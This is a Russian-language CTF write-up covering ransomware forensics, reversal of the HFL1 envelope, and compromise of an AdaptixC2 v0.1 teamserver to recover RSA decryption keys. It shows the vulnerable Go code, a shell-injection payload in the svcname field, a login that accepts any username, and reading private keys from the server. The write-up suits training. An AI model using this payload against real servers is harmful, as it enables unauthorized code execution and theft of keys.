# Lavender — alfaCTF 2026

**Категория:** Forensics / OSINT / Web  
**Сложность:** Medium  
**Теги:** forensics, linux, ext4, encase, osint, c2, adaptixc2, rce, ransomware  
**Флаг:** `alfa{YoU_jusT_SAved_A_c0fFeE_sHOp}`

## Описание

Небольшая сеть кофеен (Northwind Coffee Roasters) подверглась атаке шифровальщика. Дан криминалистический образ EnCase (`CAFE.E01/E02`) заражённой машины. Цель — расшифровать `/home/user/Documents/NorthwindCoffee/accounting/flag.txt.GSenc`.

Цепочка: достаём артефакты из E01 → реверсим формат конверта шифровальщика → OSINT определяет C2-стек как AdaptixC2 v0.1 → авторизация и RCE на тимсервере оператора → эксфильтрация подходящего RSA-ключа → расшифровка флага.

## Этап 1 — Форензика

В образе — ext4-раздел со смещением 2048 внутри `CAFE.E01`. Читаем его напрямую через sleuthkit (macOS не умеет монтировать ext4):

```
fls -o 2048 -r CAFE.E01
icat -o 2048 CAFE.E01 <inode>   # для каждого артефакта
```

Извлечено:

- `flag.txt.GSenc` — 334 Б, зашифрованный флаг
- `GS-encrypt` — Go ELF, сам шифровальщик
- `agent.bin` — Linux-бинарь, gopher-агент AdaptixC2 (пост-эксплуатация)
- `system.journal`, `user-1000.journal` — журналы systemd, в них видны `python3 /tmp/northwind_setup.py` и `/tmp/place_flag.sh` — подготовка CTF-задания

## Этап 2 — Реверс шифровальщика

`GS-encrypt` написан на Go (с зашитым vcs.revision), пути к исходникам: `linux_dump/cmd/hybrid-encrypt/main.go` и `linux_dump/internal/hybrid/hybrid.go`.

```
go tool nm GS-encrypt | grep embeddedPublicKeyPEM
go tool objdump -s "linux_dump/internal/hybrid.MarshalEnvelope" GS-encrypt
```

Встроенный RSA-2048 публичный ключ лежит по смещению `0x2a9580` (длина 451 Б). Дизассемблирование `MarshalEnvelope` раскрывает формат конверта `HFL1`:

```
magic[4]      = "HFL1"
version       u8
keyAlgo       u8   (1 = RSA-OAEP-SHA256)
dataAlgo      u8   (1 = AES-256-GCM)
wrappedKeyLen u16  BE
nonceLen      u16  BE
ciphertextLen u32  BE
wrappedKey[wrappedKeyLen]
nonce[nonceLen]
ciphertext+tag[ciphertextLen]
```

Для нашего файла: `version=1, wrapped=256, nonce=12, ct=51`.

## Этап 3 — OSINT → C2

Подсказка в Telegram-канале CTF указала на `gigashad.xyz` и видео с настройкой атакующего. На видео он подключается к `lab.gigashad.xyz:4321` через **AdaptixC2**, а интерфейс диалога подключения соответствует тегу **v0.1** (коммит `18db12a`, 26.01.2025) — до появления OTP, четырёхпольный диалог.

Подпись на видео — ключевая подсказка:

> Всё готово, можно создать Listener и Агента и закинуть к жертве

То есть после подключения: создать листенер, сгенерировать агента и «закинуть к жертве». В нашей задаче «жертва» — это сервер самого оператора (машина, на которой лежит приватный ключ GS-encrypt).

## Этап 4 — Аутентификация

`profile.json` в v0.1 содержит один общий пароль. `tcLogin` проверяет только `SHA256(password) == ts.Hash` и подписывает JWT с любым `username`, который передал клиент — нет таблицы пользователей и нет ролевой модели. С паролем `pass` можно войти под любым именем, включая `gigashad`.

`tcConnect` безусловно поднимает WebSocket и читает первый фрейм как `{"access_token":"<jwt>"}`. (Без OTP, без `?otp=` в query-параметрах.)

## Этап 5 — RCE: инъекция через `svcname` в `/agent/generate`

В `Extenders/agent_beacon/pl_agent.go:185`:

```go
cmdConfig = fmt.Sprintf(
    "%s %s %s/config.cpp -DSERVICE_NAME='\"%s\"' -DPROFILE='\"%s\"' -DPROFILE_SIZE=%d -o %s/config.o",
    Compiler, CFlag, ObjectDir,
    generateConfig.SvcName, string(agentProfile), agentProfileSize, tempDir,
)
runnerCmdConfig := exec.Command("sh", "-c", cmdConfig)
```

`SvcName` (поле `svcname` в JSON-конфиге генерации агента) подставляется напрямую в аргумент `sh -c` с обрамлением `'"..."'`. Закрытие одинарной кавычки позволяет выйти из контекста строки.

При ошибке сборки коннектор возвращает stderr клиенту:

```go
if err != nil { return nil, "", errors.New(string(stderr.Bytes())) }
```

Поэтому перенаправляем вывод команды в stderr и вызываем `false` для гарантированного возврата ошибки — получаем вывод в JSON-ответе.

Полезная нагрузка:

```
svcname = "'; (CMD) 1>&2; false; #"
```

Результат внутри `sh -c`:

```
... -DSERVICE_NAME='"'; (CMD) 1>&2; false; #"' -DPROFILE='"..."' ...
```

Для работы `TsListenerGetProfile` перед генерацией агента нужен существующий листенер типа `external/http/BeaconHTTP` — эксплойт создаёт его на 127.0.0.1 с рандомным портом и останавливает после.

## Этап 6 — Добыча ключа

Разведка изнутри контейнера тимсервера:

```
uid=10001(adaptix) ... cwd=/root/AdaptixC2/extenders/agent_beacon
$ find / -name "priv*.pem"
/DECRYPTION_KEYS/Stonegate_Partners_Labs/private.pem
/DECRYPTION_KEYS/Redwood_Works_Operations/private.pem
/DECRYPTION_KEYS/Northwind_Coffee_Roasters/private.pem
```

`cat` ключа Northwind — модуль совпадает с публичным ключом из `GS-encrypt`. Это нужный ключ.

## Этап 7 — Расшифровка

Разбираем HFL1-конверт, RSA-OAEP-SHA256 снимает обёртку с AES-256 ключа, AES-GCM расшифровывает тело:

```
$ python3 decrypt.py flag.txt.GSenc priv.pem
alfa{YoU_jusT_SAved_A_c0fFeE_sHOp}
```

## Флаг

`alfa{YoU_jusT_SAved_A_c0fFeE_sHOp}`

## Файлы

Решающие скрипты: [`artifacts/`](artifacts/)

| Файл | Назначение |
|------|------------|
| `exploit.py` | Драйвер RCE для AdaptixC2 v0.1 — логин под `gigashad`, создание `BeaconHTTP`-листенера, инъекция через `svcname`, остановка листенера |
| `decrypt.py` | Декодер конвертов HFL1 — RSA-OAEP-SHA256 снимает обёртку с AES-ключа, AES-GCM расшифровывает тело |
